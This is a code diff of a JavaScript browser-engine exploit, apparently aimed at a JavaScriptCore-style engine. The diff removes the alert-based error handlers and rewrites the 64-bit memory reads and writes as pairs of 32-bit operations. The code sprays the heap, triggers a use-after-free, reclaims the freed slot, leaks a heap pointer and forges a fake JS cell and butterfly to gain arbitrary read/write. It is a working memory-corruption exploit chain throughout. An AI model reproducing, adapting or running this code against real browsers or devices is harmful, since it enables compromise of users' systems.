@@ -6,14 +6,13 @@ import { die, DieError, log, clear_log, sleep, hex, align } from "./module/utils
 import * as off from "./module/offset.mjs";
 import * as config from "./config.mjs";
 
-
+ 
 
 const UAF_SIZE = off.size_strimpl + off.size_inline;
 const SPRAY_COUNT = 0x400;
 
-function gc() {
-  new Uint8Array(4 * MB);
-}
+function gc() {     new Uint8Array(4 * 1024 * 1024); }
+
 function spray(count, size) {
   const arr = [];
   for (let i = 0; i < count; i++) {
@@ -54,30 +53,6 @@ function findCorrupted(buffers) {
 }
 
 async function main() {
-
-  	addEventListener('error', event => {
-    const reason = event.error;
-    alert(
-        'Unhandled error\n'
-        + `${reason}\n`
-        + `${reason.sourceURL}:${reason.line}:${reason.column}\n`
-        + `${reason.stack}`
-    );
-    return true;
-});
-
-addEventListener('unhandledrejection', event => {
-    const reason = event.reason;
-    alert(
-        'Unhandled rejection\n'
-        + `${reason}\n`
-        + `${reason.sourceURL}:${reason.line}:${reason.column}\n`
-        + `${reason.stack}`
-    );
-});
-
-    log(`[+] START`);
-
   const pre = spray(SPRAY_COUNT, UAF_SIZE);
   const leaked = await doUAF(1600);
   gc(); await sleep();
@@ -86,7 +61,12 @@ addEventListener('unhandledrejection', event => {
   log(`[+] Reclaimed slot at index ${idx}`);
 
   const dv = new DataView(buf.buffer);
-  const leakPtr = dv.getBigUint64(off.strimpl_inline_str, true);
+  function read64(view, offset) {
+    const low = view.getUint32(offset, true);
+    const high = view.getUint32(offset + 4, true);
+    return BigInt(low) + (BigInt(high) << 32n);
+  }
+  const leakPtr = read64(dv, off.strimpl_inline_str);
   log(`[+] Leaked pointer: ${hex(leakPtr)}`);
 
   const KNOWN = BigInt(off.heap_slide);
@@ -95,9 +75,11 @@ addEventListener('unhandledrejection', event => {
 
   const fake = new Uint8Array(UAF_SIZE);
   const fv = new DataView(fake.buffer);
-  fv.setBigUint64(0, base + BigInt(off.js_cell_header), true);
-  fv.setBigUint64(off.js_butterfly, base + BigInt(off.butterfly_data), true);
-  fv.setBigUint64(off.js_butterfly - 0x10, 7n, true);
+  fv.setUint32(0, Number((base + BigInt(off.js_cell_header)) & 0xffffffffn), true);
+  fv.setUint32(4, Number(((base + BigInt(off.js_cell_header)) >> 32n) & 0xffffffffn), true);
+  fv.setUint32(off.js_butterfly, Number((base + BigInt(off.butterfly_data)) & 0xffffffffn), true);
+  fv.setUint32(off.js_butterfly+4, Number(((base + BigInt(off.butterfly_data)) >> 32n) & 0xffffffffn), true);
+  fv.setUint32(off.js_butterfly - 0x10, 7, true);
   fv.setUint32(off.js_butterfly - 8, 1, true);
   fv.setUint32(off.js_butterfly - 4, 1, true);
 
@@ -125,5 +107,4 @@ addEventListener('unhandledrejection', event => {
   log('Arbitrary R/W ready!');
 }
 
- main().catch(e => alert(e.message));
-
+main().catch(e=>alert(e));
